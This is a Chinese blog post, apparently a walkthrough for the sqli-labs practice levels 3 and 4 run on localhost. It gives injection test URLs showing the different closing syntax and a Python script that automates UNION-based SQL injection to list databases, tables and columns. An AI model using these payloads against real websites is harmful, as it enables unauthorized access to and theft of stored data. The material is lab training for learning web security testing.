        <h1 id="Sql-Labs3-x2F-Sql-Labs4"><a href="#Sql-Labs3-x2F-Sql-Labs4" class="headerlink" title="Sql-Labs3&#x2F;Sql-Labs4"></a>Sql-Labs3&#x2F;Sql-Labs4</h1><p>有了以上基础以后，以下的操作就很简单了，直接进行测试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-3/?id=1&#x27; 		//报错提示user near &quot;1&quot;)</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-3/?id=1&#x27;)--+       //正常 说明了一切 闭合方式不同	</span><br></pre></td></tr></table></figure>

<p><img src="/web%E6%B8%97%E9%80%8F/sql-labs/Sql-Lab3/Sql-Lab3%5Cimage-20230413095705461.png" alt="image-20230413095705461"></p>
<p><img src="/web%E6%B8%97%E9%80%8F/sql-labs/Sql-Lab3/Sql-Lab3%5Cimage-20230413095758789.png" alt="image-20230413095758789"></p>
<p>二话不说直接该脚本跑：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">def database(chose,size):</span><br><span class="line">    for i in range(size):</span><br><span class="line">        dic = &#123;</span><br><span class="line">            0: &quot; union select 1,(select schema_name from information_schema.schemata limit &quot; + str(i) + &quot;,1),&#x27;str&#x27;&quot;,</span><br><span class="line">            1: &quot; union select 1,(select table_name from information_schema.tables where table_schema =&#x27;security&#x27; limit &quot; + str(</span><br><span class="line">                i) + &quot;,1),&#x27;str&#x27;&quot;,</span><br><span class="line">            2: &quot; union select 1,(select column_name from information_schema.columns where table_schema = &#x27;security&#x27; and table_name =&#x27;emails&#x27; limit &quot; + str(</span><br><span class="line">                i) + &quot;,1),&#x27;str&#x27;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        req = requests.get(&quot;http://127.0.0.1/sqli-labs/Less-3/&quot;, params=&#123;&#x27;id&#x27;: &quot;-1&#x27;)&quot; + str(dic[chose])+ &quot;#&quot;&#125; )</span><br><span class="line">        soup = BeautifulSoup(req.text, &#x27;html.parser&#x27;)</span><br><span class="line">        x = soup.get_text(strip=True).split(&quot; &quot;)</span><br><span class="line">        print(x[-2:])</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(&quot;0:暴库&quot;)</span><br><span class="line">    print(&quot;1:暴表&quot;)</span><br><span class="line">    print(&quot;2:暴字段&quot;)</span><br><span class="line">    database(int(input(&quot;请选择方式:&quot;)),int(input(&quot;迭代次数:&quot;)))</span><br></pre></td></tr></table></figure>

<hr>
<p>Sql-Lab3和4 是雷同的 只是3的闭合方式是’) 而 4的闭合方式是” 不一一列举了。</p>
